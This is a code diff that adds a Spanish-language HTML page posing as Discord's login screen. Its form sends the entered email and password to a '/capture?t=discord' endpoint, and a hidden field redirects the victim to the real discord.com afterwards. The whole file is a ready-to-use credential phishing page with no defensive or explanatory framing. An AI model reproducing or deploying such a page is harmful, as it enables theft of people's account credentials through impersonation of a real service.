@@ -1,0 +1,27 @@
+  <!DOCTYPE html>
+  <html lang="es">
+  <head>
+    <meta charset="utf-8">
+    <title>Discord - Iniciar sesión</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+      body{margin:0;background:#202225;font-family:'gg sans','Noto Sans',sans-serif;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center}
+      .container{max-width:400px;width:90%;background:#36393f;padding:40px;border-radius:8px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.6)}
+      h2{font-size:28px;margin-bottom:30px;font-weight:600}
+      input{width:100%;padding:14px;margin:10px 0;background:#2f3136;border:none;border-radius:6px;color:#fff;font-size:16px}
+      button{background:#5865f2;color:#fff;padding:14px;border:none;border-radius:6px;width:100%;font-weight:600;font-size:16px;cursor:pointer;margin-top:10px}
+      button:hover{background:#4752c4}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h2>Bienvenido de nuevo</h2>
+      <form action="/capture?t=discord" method="POST">
+        <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required autocomplete="username">
+        <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+        <button type="submit">Iniciar sesión</button>
+        <input type="hidden" name="redirect" value="https://discord.com/app">
+      </form>
+    </div>
+  </body>
+  </html>
